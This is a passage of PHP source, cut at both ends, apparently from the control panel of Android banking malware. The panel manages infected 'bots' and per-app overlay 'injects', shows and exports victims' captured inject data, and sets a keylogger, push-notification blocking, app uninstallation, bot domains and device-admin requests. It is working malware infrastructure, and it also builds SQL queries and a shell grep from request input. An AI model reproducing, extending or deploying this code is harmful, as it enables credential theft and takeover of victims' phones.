			foreach($files as $f)
			{
				if(!endsWith($f, ".log")) continue;
				$f = str_replace(".log", "", $f);
				
				$sz = filesize("../data/{$f}.log");
				$sz_total += $sz;
				$sizes[$f] = $sz;
			}
			
			arsort($sizes);
			
			$sz_total = size_readable($sz_total);
			$html = "<h3>Total size: {$sz_total}</h3>";
			$html .= "<table class='table table-bordered'>";
			foreach($sizes as $f=>$sz)
			{
				$sz_readable = size_readable($sz);
				$res = $this->db->fetch("select comment from bots where bot_id='{$f}'", true);
				$comm = (sizeof($res))? "<br /><span style='font-style: italic; color: grey'>{$res[0]['comment']}</span>" : "";

				$html .= "<tr>
				<td width='200px' style='text-align: left'><a style='color: darkblue' href='?a=admin&action=logs&bot_id=$f'>#$f</a>
				{$comm}</td>
				<td width='100px'>{$sz_readable}</td>
				<td width='100px'><a href='?a=admin&action=logs&delete_log={$f}' onclick='return confirm(\"Are you sure?\");'><button class='btn btn-sm btn-danger'><i class='flaticon-trash' style='color: white'></i></button></a></td>
				</tr>";
			}

			$html .= "</table>";
			$page = str_replace('%LOG_BODY%', $html, $page);
		}
		
		if(isset($_REQUEST['bot_id']))
			$page = str_replace("%FILTER_BOT_ID_VALUE%", $_REQUEST['bot_id'], $page);
		else
			$page = str_replace("%FILTER_BOT_ID_VALUE%", '', $page);
		
		if(isset($_REQUEST['filter_text']))
			$page = str_replace("%FILTER_TEXT_VALUE%", $_REQUEST['filter_text'], $page);
		else
			$page = str_replace("%FILTER_TEXT_VALUE%", '', $page);
			
		return $page . $js_message;
	}
	
	function quick_search($text, $bot_id)
	{
		$log_file = "../data/{$bot_id}";
		
		if(!file_exists($log_file) || $text == "")
		{
			return "";
		}
		
		$text_cmd = escapeshellcmd($text);
		$cmd = "grep \"{$text_cmd}\" {$log_file}";
		
		$out = null;
		exec($cmd, $out);
		
		return implode("\n", $out);
	}

	function smarts_create_post($smarts, &$vars)
	{
		if(!isset($_POST['stype'])) return;

		$group = trim($_POST['group']);
		if(!preg_match('/^[a-zA-Z0-9]{1,16}$/i', $group))
		{
			$vars['msg'] = $this->msg_err("Group name is incorrect");
			return;
		}
		$group = strtolower($group);
		
		$package = trim($_POST['package']);
		if(!preg_match('/^[a-zA-Z0-9\.]{3,128}$/i', $package))
		{
			$vars['msg'] = $this->msg_err("Package name is incorrect");
			return;
		}
		
		$is_active = (isset($_POST['is_active']))? 1 : 0;
	
		if(isset($_FILES['cap_data']) && $_FILES['cap_data']['error'] == 0)
			$cap_data = trim(file_get_contents($_FILES['cap_data']['tmp_name']));
		else
			$cap_data = "";

		if(isset($_FILES['icon']) && $_FILES['icon']['error'] == 0)
		{
			if(!imagecreatefrompng($_FILES['icon']['tmp_name']))
			{
				$vars['msg'] = $this->msg_err("Icon is not valid PNG file");
				return;
			}
			
			$icon = file_get_contents($_FILES['icon']['tmp_name']);
		}else
			$icon = "";
		
		if($_POST['stype'] == "html" && isset($_FILES['html']))
		{
			$type = 'html';
			if($_FILES['html']['error'] != 0)
			{
				$vars['msg'] = $this->msg_err("Error uploading HTML file: " . $_FILES['html']['error']);
				return;
			}
			
			$data = trim(file_get_contents($_FILES['html']['tmp_name']));
			
			if(strlen($data) < 3)
			{
				$vars['msg'] = $this->msg_err("HTML file is too small");
				return;
			}
			
		}else if($_POST['stype'] == "url"){
			
			$type = 'url';
			$url = trim($_POST['url']);
			$close_rule = trim($_POST['close_rule']);
			$data = $url . ":CLOSE_ON:" . $close_rule;
		}else{
			$vars['msg'] = $this->msg_err("Error");
			return;
		}
		
		if($smarts->add_smart($type, $group, $package, $data, $cap_data, $icon, $is_active))
			$vars['msg'] = $this->msg_ok("Inject has been added");
		else
			$vars['msg'] = $this->msg_err("Error adding inject");
	}
	
	function smarts_manage($smarts)
	{
		if(!isset($_GET['smart_id'])) return;
		$sid = (int) $_GET['smart_id'];
		
		$vars = [];
		$this->smarts_manager_post($smarts, $sid, $vars);
		
		$sql = "select * from smarts where id={$sid}";
		$res = $this->db->fetch($sql, true);
		if(!sizeof($res)) return;
		
		$inj_data = $res[0];
		
		$is_active = (bool) $inj_data['is_active'];
		$pkg = $inj_data['package'];
		$group = $inj_data['sgroup'];
		
		if($group == "specials")
		{
			$vars['group'] = "<b style='color: orange'>".strtoupper($group)."</b>";
		}else{
			$vars['group'] = strtoupper($group);
		}
		
		$vars['icon'] = icon_img($inj_data['icon']);
		
		if(array_key_exists($pkg, Bots::$special_injects))
			$vars['package'] = Bots::$special_injects[$pkg];
		else
			$vars['package'] = $pkg;

		$type = $inj_data['stype'];
		if($type == 'url' && $inj_data['data'] != "")
		{
			list($url, $close_rule) = explode(":CLOSE_ON:", $inj_data['data'], 2);
			$vars['url_show'] = '';
			$vars['url'] = $url;
			$vars['url_short'] = (strlen($url) < 50)? $url : substr($url, 0, 50) . "...";
			$vars['close_rule'] = htmlspecialchars($close_rule);
		}else{
			$vars['url_show'] = 'hidden';
			$vars['url'] = $vars['close_rule'] = '';
		}
		
		$sql = "select count(id) from smarts_data where smart_id={$sid}";
		$logs_sz = (int) $this->db->fetch($sql, true)[0]['count(id)'];
		$vars['logs_sz'] = $logs_sz;

		$vars['state'] = $smarts->getStatus($pkg, $inj_data['is_active'], ($inj_data['cap_data'] != ""), ($logs_sz > 0));

		if(!array_key_exists($pkg, Bots::$special_injects))
		{
			$butts = "";
			if(!$is_active && $logs_sz > 0)
				$butts .= "<a href='?a=admin&action=smarts&sub_action=manage&do=activate&smart_id={$sid}'><button class='btn btn-xs btn-magenta'>Re-Activate</button></a>";
			else if(!$is_active)
				$butts .= "<a href='?a=admin&action=smarts&sub_action=manage&do=activate&smart_id={$sid}'><button class='btn btn-xs btn-danger'>Activate</button></a>";
			else
				$butts .= "<a href='?a=admin&action=smarts&sub_action=manage&do=deactivate&smart_id={$sid}'><button class='btn btn-xs btn-success'>Deactivate</button></a>";
			
			$vars['butt'] = $butts;
		}else{
			$vars['butt'] = "";
		}

		if(array_key_exists($pkg, Bots::$special_injects))
			$package_html = "<b>{$pkg}</b>";
		else
			$package_html = "
			<input type='hidden' name='package_original' value='{$pkg}' />
			<input type='text' class='form-control' name='package' value='{$pkg}' />";

		if($type == "html")
		{
			//~ $preview_src = "data:text/html;base64," . base64_encode($inj_data['data']);
			//~ $preview_cap_src = "data:text/html;base64," . base64_encode($inj_data['cap_data']);
			
			$form = file_get_contents('tpls/smarts_save_html.html');
			$form = str_replace('%SID%', $sid, $form);
			$form = str_replace('%PACKAGE%', $package_html, $form);
			$form = str_replace('%HTML%', htmlentities($inj_data['data']), $form);
			$form = str_replace('%CAP_DATA%', htmlentities($inj_data['cap_data']), $form);
			$vars['content_edit'] = $form;
			
		}else{
			
			$link = "<a href='{$url}' target='_blank'>Open URL '{$url}'</a>";
			
			//~ $preview_src = addslashes($link);
			//~ $preview_cap_src = "data:text/html;base64," . base64_encode($inj_data['cap_data']);

			$form = file_get_contents('tpls/smarts_save_url.html');
			$form = str_replace('%SID%', $sid, $form);
			$form = str_replace('%PACKAGE%', $package_html, $form);
			$form = str_replace('%URL%', htmlentities($link), $form);
			$form = str_replace('%CLOSE_RULE%', htmlentities($close_rule), $form);
			$form = str_replace('%CAP_DATA%', htmlentities($inj_data['cap_data']), $form);
			$vars['content_edit'] = $form;
		}
		
		$vars['content_preview'] = "
		<script> 
		function showIframe(name)
		{
			var html = $('#' + name).val()
			var html_64 = btoa(unescape(encodeURIComponent(html)))
			$('#iframe_preview').prop('src', 'data:text/html;base64,' + html_64)
			$('#iframe_preview').show()
		}
		</script>
		
		<button type='button' class='btn btn-success' onclick='showIframe(\"inj_data\")'>Preview inject</button>
		<button type='button' class='btn btn-info' onclick='showIframe(\"textarea_cap_data\")'>Preview cap</button><br />
		<iframe style='display: none; margin-top: 10px' id='iframe_preview' src='' height='500px' width='100%'></iframe>
		";
		
		// SHOW LOGS
		$vars['content_logs'] = $smarts->getLogsTable($sid, $pkg);
		
		return $this->_make_page("smarts_manage", $vars);
	}
	
	function smarts_manager_post($smarts, $sid, &$vars)
	{
		if(isset($_REQUEST['do']))
		{
			$bot_id = "";
			if(isset($_REQUEST['bot_id']) && isValidBotId($_REQUEST['bot_id']))
				$bot_id = $_REQUEST['bot_id'];

			if($_REQUEST['do'] == "activate")
			{
				if($bot_id != "")
					$res = $smarts->enable($bot_id, $sid);
				else
					$res = $smarts->toggle_global($sid, 1);
				
				$vars['msg'] = ($res)? $this->msg_ok("Inject was activated") : $this->msg_err("Inject activation error");
				
				if($bot_id != "")
				{
					$vars['msg'] .= redirect("?a=admin&action=bots&bbot_id={$bot_id}&page=bot_page#injects", 2);
					return;
				}

			}else if($_REQUEST['do'] == "deactivate"){

				if($bot_id != "")
					$res = $smarts->disable($bot_id, $sid);
				else
					$res = $smarts->toggle_global($sid, 0);

				$vars['msg'] = ($res)? $this->msg_ok("Inject was deactivated") : $this->msg_err("Inject deactivation error");

				if($bot_id != "")
				{
					$vars['msg'] .= redirect("?a=admin&action=bots&bbot_id={$bot_id}&page=bot_page#injects", 2);
					return;
				}

			}else if($_REQUEST['do'] == "activate_all"){

				$res = $smarts->toggle_global_all(1);
				$vars['msg'] = ($res)? $this->msg_ok("All injects were activated") : $this->msg_err("Injects activation error");
				echo redirect("?a=admin&action=smarts", 0);
				die;
				
			}else if($_REQUEST['do'] == "deactivate_all"){
				
				$res = $smarts->toggle_global_all(0);
				$vars['msg'] = ($res)? $this->msg_ok("All injects were deactivated") : $this->msg_err("Injects deactivation error");
				echo redirect("?a=admin&action=smarts", 0);
				die;
				
			}else if($_REQUEST['do'] == "save_html"){
			
				if(trim($_POST['package']) == "")
				{
					$vars['msg'] = $this->msg_err("Package can not be empty");
					return;
				}
				
				// update smart package name if it's not special
				if(isset($_POST['package']) && isset($_POST['package_original']))
				{
					if(trim($_POST['package']) != trim($_POST['package_original']))
					{
						$pkg2 = $this->db->escape(trim($_POST['package']));
						$pkg_orig2 = $this->db->escape(trim($_POST['package_original']));
						
						$sql = "SELECT count(id) FROM `smarts` WHERE package in({$pkg2}, {$pkg_orig2});";
						$res = $this->db->fetch($sql, true);
						
						if($res[0]["count(id)"] == "2")
						{
							$vars['msg'] = $this->msg_err("Inject with package {$pkg2} already exists");
							return;
						}else{
							$sql = "update smarts set package={$pkg2} where id={$sid}";
							$this->db->fetch($sql);
						}
					}
				}
				
				if(trim($_POST['html']) == "")
				{
					$vars['msg'] = $this->msg_err("Inject body can not be empty");
					return;
				}
				
				$smarts = new Smarts($this->db);
				$smarts->save($sid, $_POST['html'], $_POST['cap_data'], $_FILES['icon']);
				return;
				
			}else if($_REQUEST['do'] == "save_url"){
				
				if(trim($_POST['package']) == "")
				{
					$vars['msg'] = $this->msg_err("Package can not be empty");
					return;
				}
				
				$url = trim($_POST['url']);
				if($url == "")
				{
					$vars['msg'] = $this->msg_err("URL can not be empty");
					return;
				}
				
				$close_rule = trim($_POST['close_rule']);
				if($close_rule == "")
				{
					$vars['msg'] = $this->msg_err("Close Rule can not be empty");
					return;
				}
				
				// update smart package name if it's not special
				if(isset($_POST['package']) && isset($_POST['package_original']))
				{
					if(trim($_POST['package']) != trim($_POST['package_original']))
					{
						$pkg2 = $this->db->escape(trim($_POST['package']));
						$pkg_orig2 = $this->db->escape(trim($_POST['package_original']));
						
						$sql = "SELECT count(id) FROM `smarts` WHERE package in({$pkg2}, {$pkg_orig2});";
						$res = $this->db->fetch($sql, true);
						
						if($res[0]["count(id)"] == "2")
						{
							$vars['msg'] = $this->msg_err("Inject with package {$pkg2} already exists");
							return;
						}else{
							$sql = "update smarts set package={$pkg2} where id={$sid}";
							$this->db->fetch($sql);
						}
					}
				}
				
				$data = "{$url}:CLOSE_ON:{$close_rule}";
				
				$smarts = new Smarts($this->db);
				$smarts->save($sid, $data, $_POST['cap_data'], $_FILES['icon']);
				return;
			
			}else if($_REQUEST['do'] == "delete_logs"){
				
				$ids = [];
				if(isset($_REQUEST['to_delete']) && sizeof($_REQUEST['to_delete']))
				{
					foreach($_REQUEST['to_delete'] as $id)
						$ids[] = (int) $id;
						
					$ids = array_unique($ids);
					$ids_str = implode(",", $ids);
					
					$sql = "delete from smarts_data where id in({$ids_str})";
					$this->db->fetch($sql);
					
					if(isset($_REQUEST['bot_id']) && isValidBotId($_REQUEST['bot_id']))
					{
						$bot_id = $_REQUEST['bot_id'];
						$vars['msg'] .= redirect("?a=admin&action=bots&bbot_id={$bot_id}&page=bot_page#injects", 0);
					}else{
						$vars['msg'] .= redirect("?a=admin&action=smarts&sub_action=manage&smart_id={$sid}#logs", 0);
					}
					return;
				}
			}
			
			$vars['msg'] .= redirect("?a=admin&action=smarts&sub_action=manage&smart_id={$sid}", 1);
			return;
		}
		
		
		
	}
	
	function smarts_create($smarts)
	{
		$vars = [];
		$this->smarts_create_post($smarts, $vars);
		return $this->_make_page("smarts_import", $vars);
	}
	
	function smarts_import($smarts)
	{
		$vars = [];
		$vars['max_size'] = ini_get('upload_max_filesize');
		
		if(isset($_FILES["zip"]) && $_FILES["zip"]["error"] == 0)
		{
			$use_folders = isset($_POST['use_folders']);
			$fixed_group_name = preg_replace('/[^a-zA-Z0-9]/i', '', $_POST['group']);
			$fixed_group_name = substr($fixed_group_name, 0, 15);
			
			if(!$use_folders && $fixed_group_name == "")
			{
				$vars['msg'] = $this->msg_err("Group name can not be empty");
				
			}else{
				if($smarts->importZip($use_folders, $fixed_group_name, $_FILES["zip"]["tmp_name"]))
				{
					$vars['msg'] = $this->msg_ok($smarts->lastMsg . " injects were imported successfully");
				}else{
					$msg = "Error importing ZIP";
					if($smarts->lastError != "")
						$msg .= ": " . $smarts->lastError;

					$vars['msg'] = $this->msg_err($msg);
				}
			}
		}
		
		return $this->_make_page("smarts_import", $vars);
	}
	
	function get_smart_logs()
	{
		$vars = [];
		
		if(isset($_POST['data_ids']) && sizeof($_POST['data_ids']))
		{
			$ids = [];
			foreach($_POST['data_ids'] as $id)
				$ids[] = (int) $id;
			
			$sql = "delete from smarts_data where id in(".implode(",", $ids).")";
			$res = $this->db->fetch($sql);
			
			if($this->db->getLastError() == "")
				$vars['msg'] = $this->msg_ok(sizeof($ids) . " records were removed");
			else
				$vars['msg'] = $this->msg_err("Error deleting records");
		}
		
		$sql = "select count(id) from smarts_data";
		$total = $vars['logs_sz'] = $this->db->fetch($sql, true)[0]["count(id)"];
		
		##### PAGING
		$page_number = (isset($_GET['page_number']))? (int) $_GET['page_number'] : 0;
		$rows_on_page = (isset($_GET['rows_number']))? (int) $_GET['rows_number'] : 10;
		
		$paging = $this->get_limit($total, $rows_on_page, $page_number);
		//var_dump($paging);
		$limit = $paging['sql'];
		#####
		
		$data = "";
		
		$sql = "select smarts_data.id as data_id, smarts_data.bot_id, smarts.stype, smarts.sgroup, smarts.package, time, smarts_data.data from smarts, smarts_data where smarts.stype<>\"url\" AND smarts.id=smarts_data.smart_id order by smarts_data.id desc {$limit}";
		//~ var_dump($sql);
		$res = $this->db->fetch($sql, true);
		
		if($this->db->getLastError() != "")
			dd($this->db->getLastError());
		
		if(sizeof($res))
		{
			$sz = sizeof($res);
			$data = "

<script>
function select_all_data()
{
$('input[type=\"checkbox\"][name=\"data_ids[]\"]').each(function(a, e){ $(e).prop('checked', !$(e).prop('checked')); })
}
</script>

<form id='deleteForm' method='post'>

<button type='button' class='btn btn-info' onclick='select_all_data()'>Select&nbsp;all</button>
&nbsp;&nbsp;
<button type='submit' class='btn btn-danger' onclick='return confirm(\"Are you sure?\")'>Delete selected</button>

			<table class='table table-bordered' style='margin-top: 10px'>
			<tr>
				<th>Id</th>
				<th>Bot ID<br />Comment</th>
				<th>Time</th>
				<th>Type</th>
				<th>Group</th>
				<th width='50'>Package</th>
				<th>Log</th>
			</tr>";
			
			// get comments
			$comments = [];
			$sql = "select bots.bot_id, comment from bots, smarts_data where smarts_data.bot_id=bots.bot_id group by bots.bot_id;";
			$resComm = $this->db->fetch($sql, true);
			if($this->db->getLastError() == "" && sizeof($resComm))
			{
				foreach($resComm as $rowComm)
					$comments[$rowComm['bot_id']] = $rowComm['comment'];
			}
			
			foreach($res as $row)
			{
				$time = date("d.m.Y G:i:s", $row['time']);
				$time = str_replace(' ', '<br />', $time);
				
				$comm = $comments[$row['bot_id']];
				$commHTML = "";
				if($comm != "")
					$commHTML = "<br /><span style='color: grey; font-style: italic'>{$comm}</span>";
				
				$id = $row['data_id'];
				$type = $row['stype'];
				$group = strtoupper($row['sgroup']);
				$pkg = $row['package'];
				
				if(array_key_exists($pkg, Bots::$special_injects))
					$pkg = Bots::$special_injects[$pkg];
				
				if(endsWith(trim($row['data']), "Value:"))
				{
					$data .= "<tr><td colspan='10'>empty value</td></tr>";
					continue; // no value, skip it
				}
				
				$text = Smarts::formatLog($type, $group, $pkg, $row['data']);

				$bot_id = "<input type='text' style='border: 0; width: 100%; font-family: monospace; font-size: 8pt' onclick='this.select()' value='{$row['bot_id']}'>";
				
				if(is_array($text)){
					//~ $rows = 3;
					//~ $textarea = "<textarea style='width: 100%' rows='{$rows}'>".htmlspecialchars(implode("\n", $text))."</textarea></div>";
					
					continue; // URL-inject with cookies, skip it
				}else{
					$rows = substr_count($text, "\n") + 2;
					$textarea = "<textarea style='width: 100%' rows='{$rows}'>".htmlspecialchars($text)."</textarea></div>";
				}
				
				
				$data .= "
				<tr>
					<td width='10'><input type='checkbox' name='data_ids[]' value='{$row['data_id']}' title='{$row['data_id']}' /></td>
					<td width='100'>{$bot_id}{$commHTML}</td>
					<td width='10'>{$time}</td>
					<td width='10'>{$type}</td>
					<td width='10'>{$group}</td>
					<td>{$pkg}</td>
					<td>{$textarea}</td>
				</tr>
				";
			}
			
			$data .= "</table></form>";
		}else{
			$data = "<center>No records yet</center>";
		}
		
		list($pages_list, $rows_list) = $this->build_paging_dropdowns($paging['pages'], $page_number, $rows_on_page);
		
		$vars['logs_list'] = $data;
		$vars['pages_total'] = $paging['pages'];
		$vars['pages_list'] = $pages_list;
		$vars['rows_list'] = $rows_list;
		$vars['page_number'] = $page_number;
		$vars['rows_number'] = $rows_on_page;

		return $this->_make_page("smart_logs", $vars);
	}
	
	function build_paging_dropdowns($pages_num, $page_number=0, $rows_on_page=10)
	{
		$pages_list = "";
		
		for($i=1;$i<$pages_num;$i++)
		{
			$pp = $i+1;
			$sel = ($page_number == $i)? "selected" : "";
			$pages_list .= "<option {$sel} value='{$i}'>{$i}</option>";
		}
		
		$rows_list = "";
		foreach(array(10, 100, 500, 1000) as $n)
		{
			$sel = ($rows_on_page == $n)? "selected" : "";
			$rows_list .= "<option {$sel} value='{$n}'>{$n}</option>";
		}
		
		return [$pages_list, $rows_list];
	}
	
	function smarts_list($smarts)
	{
		$vars = [];
		
		if(isset($_GET['do']) && $_GET['do'] == "export")
		{
			$data = "";
			
			$sql = "select smarts.stype, smarts.sgroup, smarts.package, time, smarts_data.data from smarts, smarts_data where smarts.id=smarts_data.smart_id";
			$res = $this->db->fetch($sql, true);
			
			if($this->db->getLastError() == "" && sizeof($res))
			{
				$sz = sizeof($res);
				$data = "Time,Type,Group,Package,Log\n";
				foreach($res as $row)
				{
					$time = date("d.m.Y G:i:s", $row['time']);
					$type = $row['stype'];
					$group = $row['sgroup'];
					$pkg = $row['package'];
					
					if(array_key_exists($pkg, Bots::$special_injects))
						$pkg = Bots::$special_injects[$pkg];
					
					$text = Smarts::formatLog($type, $group, $pkg, $row['data']);

					$data .= "{$time},{$type},{$group},{$pkg},\"{$text}\"\n";
				}
				
				$date = date("d.m.y", time());
				download("injects_logs_{$date}_size_{$sz}.csv", $data);
				
			}else{
				$vars['msg'] = $this->msg_ok("No records yet");
			}
		}

		if(isset($_GET['view_logs']))
		{
			return $this->get_smart_logs();
		}

		$vars['filter_value'] = '';
		$vars['filter_bot_id'] = '';

		$sql = "select id, stype, sgroup, package, IF(stype='url', data, '') as data, IF(cap_data<>'', 1, 0) as has_cap, TO_BASE64(icon) as icon_base64, is_active from smarts ";
		
		if(isset($_GET['filter']) && trim($_GET['filter']) != '')
		{
			$vars['filter_value'] = trim($_GET['filter']);
			$bot_id2 = $this->db->escape($_GET['filter']);
			$comm = substr($bot_id2, 1, strlen($bot_id2)-2);
			
			$sql_bot = "select bot_id, apps from bots where bot_id={$bot_id2} OR comment like('%{$comm}%') limit 1";
			$res = $this->db->fetch($sql_bot, true);
			if(sizeof($res))
			{
				$vars['filter_bot_id'] = "of the Bot <b>#{$res[0]['bot_id']}</b>";
				
				$apps_arr = apps2array($res[0]['apps']);
				$apps2 = "'".implode("','", $apps_arr)."'";
				$sql .= " WHERE package in($apps2)";
			}else{
				$vars['msg'] = $this->msg_err("Bot was not found");
			}
		}
		
		$sql .= " order by id";
		$res = $this->db->fetch($sql, true);
		$total = sizeof($res);
		
		$inj_by_group = [];
		foreach($res as $row)
		{
			if(!array_key_exists($row['sgroup'], $inj_by_group)) 
				$inj_by_group[$row['sgroup']] = [];
			
			$inj_by_group[$row['sgroup']][] = $row;
		}
		
		$out .= "
			<button title='Unfold all groups' onclick='$(\".table\").toggle()' class='btn btn-success btn-sm'>Unfold</button>
			&bull;
<a href='?a=admin&action=smarts&sub_action=manage&do=activate_all&smart_id=all'><button title='Activate all injects' class='btn btn-warning btn-sm'>Activate all</button></a>

<a href='?a=admin&action=smarts&sub_action=manage&do=deactivate_all&smart_id=all'><button title='Deactivate all injects' class='btn btn-success btn-sm'>Deactivate all</button></a>
		
		<a href='?a=admin&action=smarts&view_logs=1'><button style='float: right' title='Show all logs' class='btn btn-primary btn-sm'>View Logs</button></a>
		";
		
		$total_logs = 0;
		$out_specials = '';
		$out_rest = '';
		foreach($inj_by_group as $group=>$injects)
		{
			$html = '';
			$sz = sizeof($injects);
			$rnd = password(10, true);
			
			if($group == "specials")
			{
				$groupB = strtoupper($group);
				$groupB = "<b style='color: orange'>{$groupB}</b>";
			}else{
				$groupB = strtoupper($group);
			}
		
			$html .= "<h3 onclick='$(\"#group_{$rnd}\").toggle()' style='text-decoration: underline'>Group {$groupB} ({$sz})</h3>";
			
			$hidden = ($group == "specials" || $total < 50)? "" : "style='display: none'";
			$html .= "<table id='group_{$rnd}' class='table table-bordered' {$hidden}>";
			// url  id, icon/package, URL/close marker, Cap State,  logs, control
		
			// html
			$html .= "<tr>";
			$html .= "	<th width=150>Control</th>";
			$html .= "	<th>Package</th>";
			$html .= "	<th>Status</th>";
			$html .= "	<th>URL</th>";
			$html .= "	<th>Logs</th>";
			$html .= "</tr>";

			foreach($injects as $inj)
			{
				$icon = ""; //icon_img($inj['icon_base64'], false);

				$id = $inj['id'];
				
				$sql = "select count(id) from smarts_data where smart_id={$id}";
				$logs_sz = (int) $this->db->fetch($sql, true)[0]["count(id)"];

				$status = $smarts->getStatus($inj['package'], $inj['is_active'], ($inj['has_cap'] == "1"), ($logs_sz > 0));
				
				$total_logs += $logs_sz;
				if($inj['stype'] == "url")
				{
					$data = str_replace(":CLOSE_ON:", "<br /><b>Close rule:</b> ", $inj['data']);
				}else{
					$data = "&#151;";
				}
				
				$butts = $this->makeSmartButts($id, $inj['package'], (bool) $inj['is_active'], $logs_sz);
				
				if(array_key_exists($inj['package'], Bots::$special_injects))
					$pkg_name = Bots::$special_injects[$inj['package']];
				else
					$pkg_name = $inj['package'];
				
				$logs_butt = 0;
				if($logs_sz > 0)
					$logs_butt = "<a href='?a=admin&action=smarts&sub_action=manage&smart_id={$id}#logs'><button class='btn btn-xs btn-primary'>Logs ({$logs_sz})</button></a>";
				
				$html .= "<tr>";
					$html .= "	<td style='text-align: left'>{$butts}</td>";
					$html .= "	<td style='text-align: left'>{$icon} {$pkg_name}</td>";
					$html .= "	<td>{$status}</td>";
					$html .= "	<td style='text-align: left'>{$data}</td>";
					$html .= "	<td>{$logs_butt}</td>";
				$html .= "</tr>";
			}
			
			$html .= "</table>";
			
			if($group == "specials")
				$out_specials .= $html;
			else
				$out_rest .= $html;
		}

		$out .= $out_specials . $out_rest;
		
		$sql = "select count(id) from smarts where is_active=0 and cap_data<>''";
		$vars['caps_sz'] = $this->db->fetch($sql, true)[0]["count(id)"];
		$vars['logs_sz'] = $total_logs;
		$vars['injects_list'] = $out;
		$vars['injects_sz'] = $total;
		
		return $this->_make_page("smarts", $vars);
	}
	
	static function makeSmartButts($id, $package, $is_active, $logs_sz, $bot_id="")
	{
		$bot = ($bot_id != "")? "&bot_id={$bot_id}" : "";
		
		$out = "";

		$out .= "<a href='?a=admin&action=smarts&sub_action=manage&smart_id={$id}'><button class='btn btn-xs btn-warning'>Manage</button></a>&nbsp;";
		
		if(array_key_exists($package, Bots::$special_injects)) return $out;
		
		
		if(!$is_active && $logs_sz > 0)
			$out .= "<a href='?a=admin&action=smarts&sub_action=manage&do=activate&smart_id={$id}{$bot}'><button class='btn btn-xs btn-magenta'>Re-Activate</button></a>";
		else if(!$is_active)
			$out .= "<a href='?a=admin&action=smarts&sub_action=manage&do=activate&smart_id={$id}{$bot}'><button class='btn btn-xs btn-danger'>Activate</button></a>";
		else
			$out .= "<a href='?a=admin&action=smarts&sub_action=manage&do=deactivate&smart_id={$id}{$bot}'><button class='btn btn-xs btn-success'>Deactivate</button></a>";

		return $out;
	}
	
	function _make_page($tpl_name, $vars)
	{
		$page = file_get_contents("tpls/{$tpl_name}.html");
		
		foreach($vars as $v=>$val)
			$page = str_replace("%".strtoupper($v)."%", $val, $page);

		return $page . $vars['msg'];
	}
	
	function process_smarts()
	{
		$smarts = new Smarts($this->db);

		$action = (isset($_REQUEST['sub_action']))? $_REQUEST['sub_action'] : "list";

		if(method_exists($this, "smarts_{$action}"))
			return $this->{"smarts_$action"}($smarts);
	}
	
	function process_settings($page)
	{
		$delays = array("block_push_delay", "minimize_delay", "uninstall_delay", "keylogger_delay", "injects_delay", "net_delay", "get_device_admin_delay");

		if(isset($_POST['field']))
		{
			// display with ,   
			// stored with |
			// bot takes list with |
			$doms = str_replace("\n", ",", $_POST['field']['domains']);
			$doms = explode(",", $doms);
			$doms_result = "";
			foreach($doms as $d)
			{
				$d = trim($d);
				if(!$d || !strstr($d, "."))
					continue;
				
				$d = strtolower($d);
				$d = str_replace("https://", "", $d);
				$d = str_replace("http://", "", $d);
				$doms_result .= $d . "|";
			}
			$val = $this->db->escape($doms_result);
			$this->db->fetch("update config set value={$val} where name='domains_bot'");

			$desired_apps = package_list_to_array($_POST['field']['desired_apps']);
			$val = $this->db->escape(implode("\n", $desired_apps));
			$this->db->fetch("update config set value={$val} where name='desired_apps'");

			$block_push_apps = package_list_to_array($_POST['field']['block_push_apps']);
			$val = $this->db->escape(implode("\n", $block_push_apps));
			$this->db->fetch("update config set value={$val} where name='block_push_apps'");

			$minimize_apps = package_list_to_array($_POST['field']['minimize_apps']);
			$val = $this->db->escape(implode("\n", $minimize_apps));
			$this->db->fetch("update config set value={$val} where name='minimize_apps'");

			$uninstall_apps = package_list_to_array($_POST['field']['uninstall_apps']);
			$val = $this->db->escape(implode("\n", $uninstall_apps));
			$this->db->fetch("update config set value={$val} where name='uninstall_apps'");

			foreach($delays as $delay)
			{
				$val = (int) $_POST['field'][$delay];
				$this->db->fetch("update config set value={$val} where name='{$delay}'");
			}

			if(isset($_POST['field']['keylogger_enabled']))
			{
				$this->db->fetch("update config set value=1 where name='keylogger_enabled'");
			}else{
				$this->db->fetch("update config set value=0 where name='keylogger_enabled'");
			}

			// end POST
		}

		$domains = $this->db->fetch("select value from config where name='domains_bot'", true)[0]['value'];
		$domains = str_replace("|", "\n", $domains);
		$domains = substr($domains, 0, strlen($domains)-1);
		$page = str_replace("%CONF_DOMAINS%", $domains, $page);

		$desired_apps = $this->db->fetch("select value from config where name='desired_apps'", true)[0]['value'];
		$page = str_replace("%DESIRED_APPS%", $desired_apps, $page);
		
		$block_push_apps = $this->db->fetch("select value from config where name='block_push_apps'", true)[0]['value'];
		$page = str_replace("%BLOCK_PUSH_APPS%", $block_push_apps, $page);
		
		//
		
		$res = $this->db->fetch("select value from config where name='minimize_apps'", true);
		$page = str_replace("%MINIMIZE_APPS%", $res[0]['value'], $page);

		// 
		
		$res = $this->db->fetch("select value from config where name='uninstall_apps'", true);
		$page = str_replace("%UNINSTALL_APPS%", $res[0]['value'], $page);
		
		// 
		
		$res = $this->db->fetch("select value from config where name='keylogger_enabled'", true);
		$chk = ($res[0]['value'] == 1)? " checked " : "";
		$page = str_replace("%KEYLOGGER_ENABLED_CHK%", $chk, $page);
		
		// 
		$net_delay = 0;
		foreach($delays as $delay)
		{
			$res = $this->db->fetch("select value from config where name='{$delay}'", true);
			
			if($delay == "net_delay") {
				$net_delay = $res[0]['value'];
			}
			
			$page = str_replace("%".strtoupper($delay)."%", $res[0]['value'], $page);
		}

		//
		
		$page = str_replace("%PKG_PLACEHOLDER%", "com.pkg.name1
com.pkg.name2
com.pkg.name3", $page);

		// 
		
		$page = str_replace('%SMARTS_VER%', $this->getInjectsVersion(), $page);
		$page = str_replace('%EXPIRE_ON%', $this->getExpireDate(), $page);
		$page = str_replace('%SERVER_TIME%', date("M d H:i", time()), $page);
		$page = str_replace('%LAST_BACKUP_AT%', $this->getLastBackupAt(), $page);
		$page = str_replace('%PING_WARN_HIDE%', ($net_delay < 60)? "" : "hide", $page);
		
		$page = str_replace('%TEST_SERVER_ERRORS%', $this->testServer(), $page);

		if(isset($_POST['field']))
			$page .= $this->msg_ok("Settings have been saved");

		return $page;
	}
	
	function testServer()
	{
		$errors = "";
		
		if(!extension_loaded('curl')) $errors .= "ERROR: Curl not found<br />";
		
		if(!extension_loaded('pdo')) $errors .= "ERROR: PDO not found<br />";
		
		if(!extension_loaded('mbstring')) $errors .= "ERROR: mbstring not found<br />";

		if(!extension_loaded('gd')) $errors .= "ERROR: gd not found<br />";
		
		if(!extension_loaded('mcrypt')) $errors .= "ERROR: mcrypt not found<br />";
